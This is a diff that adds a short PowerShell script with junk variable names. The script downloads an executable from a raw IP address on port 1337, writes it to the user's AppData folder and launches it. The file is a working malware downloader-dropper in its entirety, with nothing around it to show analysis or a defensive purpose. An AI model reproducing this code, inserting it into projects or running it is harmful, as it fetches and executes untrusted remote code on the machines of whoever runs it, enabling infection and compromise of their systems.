@@ -1,0 +1,12 @@
+$gfgff = @(
+    "http://195.2.67.177:1337/files/f8g48gfdbhbyb2y8.exe"
+)
+$dfsgsfdg = [Environment]::GetFolderPath('ApplicationData')
+
+foreach ($link in $gfgff) {
+    $dgfsgfd = Split-Path -Leaf $link
+    $sgdf = Join-Path -Path $dfsgsfdg -ChildPath $dgfsgfd
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($link, $sgdf)
+    Start-Process -FilePath $sgdf
+}
